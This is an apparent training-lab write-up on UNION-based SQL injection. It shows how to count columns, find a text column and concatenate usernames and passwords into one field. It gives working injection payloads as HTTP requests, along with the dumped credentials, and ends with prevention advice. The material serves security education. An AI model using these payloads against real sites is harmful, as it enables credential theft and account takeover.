# SQL Injection UNION Attack - Retrieving Multiple Values in a Single Column

## Objective

Use a UNION-based SQL injection attack to retrieve usernames and passwords from the `users` table when only a single column is available for displaying text.

## Vulnerable Parameter

`category`

## Step 1: Determine the Number of Columns

Payload:

```http
GET /filter?category=Gifts' UNION SELECT NULL,NULL-- HTTP/2
```

Result:
- Success
- No error returned

Conclusion:
- The original query returns 2 columns.

## Step 2: Identify a Text-Compatible Column

Test 1:

```http
GET /filter?category=Gifts' UNION SELECT 'abc',NULL-- HTTP/2
```

Result:
- Error returned

Conclusion:
- Column 1 does not accept string data.

Test 2:

```http
GET /filter?category=Gifts' UNION SELECT NULL,'abc'-- HTTP/2
```

Result:
- Success

Conclusion:
- Column 2 accepts string data.

## Step 3: Retrieve Multiple Values in a Single Column

Since only one column could display text, the username and password values were combined into a single string using the concatenation operator.

Payload:

```http
GET /filter?category=Gifts' UNION SELECT NULL,username||'~'||password FROM users-- HTTP/2
```

Result:
- Usernames and passwords were displayed together in a single column.
- Each row appeared in the format:

```text
username~password
```

Example:

```text
administrator~password
carlos~password
wiener~password
```

## Step 4: Log In as Administrator

Using the administrator credentials retrieved from the database, I logged in as the administrator user and solved the lab.

## Explanation

The query only had one column capable of displaying text data.

To retrieve both the username and password values, they were concatenated into a single string using:

```sql
username||'~'||password
```

This produced output in the format:

```text
username~password
```

allowing both values to be displayed within a single column.

## Security Impact

An attacker could:

- Retrieve usernames and passwords.
- Compromise user accounts.
- Gain administrative access.
- Access sensitive information stored in the database.

## Prevention

- Use parameterized queries (prepared statements).
- Avoid constructing SQL queries using string concatenation.
- Validate user input.
- Apply least-privilege database permissions.
- Perform regular security testing.

## Key Concepts Learned

- UNION-based SQL injection
- Determining column counts
- Identifying text-compatible columns
- String concatenation in SQL
- Retrieving multiple values through a single column
- Extracting credentials from a database
